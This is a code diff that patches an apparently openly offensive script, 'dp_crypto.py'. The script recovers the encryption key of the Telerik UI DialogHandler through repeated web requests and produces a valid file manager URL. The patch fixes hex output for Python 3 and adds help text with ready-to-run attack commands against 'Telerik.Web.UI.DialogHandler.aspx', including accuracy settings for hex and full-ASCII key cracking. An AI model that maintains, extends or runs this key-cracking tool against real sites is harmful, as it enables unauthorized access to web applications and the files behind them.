@@ -173,7 +173,7 @@ def get_key(session):
                           (
                               keychar
                               if unprintable is False
-                              else '0x' + binascii.hexlify(keychar)
+                              else '0x' + binascii.hexlify(keychar.encode()).decode()
                           ) +
                           "} found with " +
                           str(char_requests) +
@@ -192,7 +192,7 @@ def get_key(session):
               (
                 found
                 if unprintable is False
-                else "(hex) " + binascii.hexlify(found)
+                else "(hex) " + binascii.hexlify(found.encode()).decode()
               )
               )
     print("Total web requests: " + str(requests_sent))
@@ -328,11 +328,13 @@ def mode_help():
           "for upper case hex (e.g. machine key) set to hex.")
     print("")
     print("Maximum accuracy is out of 64 where 64 is the most accurate, " +
-          "however 9 will usually suffice.")
+          "accuracy of 9 will usually suffice for a hex, but 21 or more " +
+          "might be needed when testing all ascii characters.")
+    print("Increase the accuracy argument if no valid version is found.")
     print("")
-    print("The following example should be sufficient to crack machine key " +
-          "and generate a valid file manager URL:")
-    print("./dp_crypto -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 hex 9")
+    print("Examples to generate a valid file manager URL:")
+    print("./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 hex 9")
+    print("./dp_crypto.py -k http://a/Telerik.Web.UI.DialogHandler.aspx 48 all 21")
     print("")
 
 
